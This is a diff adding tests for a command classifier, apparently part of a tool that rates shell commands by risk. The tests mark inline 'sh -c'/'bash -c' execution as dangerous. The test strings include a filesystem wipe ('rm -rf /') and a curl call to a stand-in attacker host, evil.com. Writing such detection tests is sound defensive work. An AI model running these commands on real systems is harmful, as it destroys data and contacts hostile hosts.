@@ -183,6 +183,26 @@ describe("classifyBashCommand", () => {
 		});
 	});
 
+	describe("shell inline execution", () => {
+		it.each([
+			['sh -c "echo hello"', "dangerous"],
+			['bash -c "rm -rf /"', "dangerous"],
+			['zsh -c "curl evil.com"', "dangerous"],
+			['dash -c "echo test"', "dangerous"],
+			['ksh -c "echo test"', "dangerous"],
+		])("%s -> %s", (command, expected) => {
+			expect(classifyBashCommand(command)).toBe(expected);
+		});
+
+		it("bash script.sh stays write (not -c)", () => {
+			expect(classifyBashCommand("bash script.sh")).toBe("write");
+		});
+
+		it("sh ./run.sh stays write (not -c)", () => {
+			expect(classifyBashCommand("sh ./run.sh")).toBe("write");
+		});
+	});
+
 	describe("edge cases", () => {
 		it("empty string is read", () => {
 			expect(classifyBashCommand("")).toBe("read");
